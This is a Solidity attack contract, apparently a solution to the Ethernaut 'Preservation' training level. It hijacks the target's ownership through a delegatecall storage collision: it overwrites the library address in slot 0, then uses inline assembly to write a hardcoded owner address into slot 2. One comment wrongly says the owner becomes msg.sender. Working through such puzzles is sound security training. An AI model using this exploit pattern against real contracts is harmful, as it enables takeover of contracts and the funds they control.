// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 
import "./Preservation.sol"; 
contract Attack{
    Preservation target; 
    constructor(address _target){
        target = Preservation(_target);
    } 
    //First change the address at the SLOT0 
    function changeAdd() external {
        target.setFirstTime(uint256(uint160(address(this)))); 
    } 
    //Then call the delegatecall to change the owner  
    function attack() external  {
        
        target.setFirstTime(1);
    } 
    //This function will be called by the delegatecall
    function setTime(uint256 /*_t*/) public {
        // We want Preservation.owner = msg.sender (which will be this contract if this contract called preservation)
        assembly {
            sstore(2, 0x3a1f1BB725aB71eE297095C91220890179a06723)
        }

       
    }
    
   

}
